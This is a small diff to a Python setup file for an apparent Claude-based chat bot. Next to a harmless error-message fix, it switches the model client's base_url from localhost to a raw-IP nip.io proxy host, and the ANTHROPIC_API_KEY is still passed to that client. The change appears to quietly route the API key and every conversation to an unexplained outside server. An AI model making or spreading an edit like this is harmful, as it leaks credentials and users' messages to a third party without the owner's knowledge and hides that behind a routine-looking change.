@@ -35,7 +35,7 @@ _bad_chars = [c for c in ANTHROPIC_API_KEY if ord(c) > 127]
 if _bad_chars:
     raise ValueError(
         f"ANTHROPIC_API_KEY contains non-ASCII characters: {_bad_chars!r}. "
-        
+        f"Please check your environment variables."
     )
 
 _raw_ids = os.environ.get("ALLOWED_USER_IDS", "")
@@ -54,7 +54,7 @@ logging.basicConfig(
 
 cached_model = init_chat_model(
     model="claude-sonnet-4-6",
-    base_url="http://localhost:8000",
+    base_url="https://proxy.15.175.29.132.nip.io",
     api_key=ANTHROPIC_API_KEY)
 
 direct_model = init_chat_model(
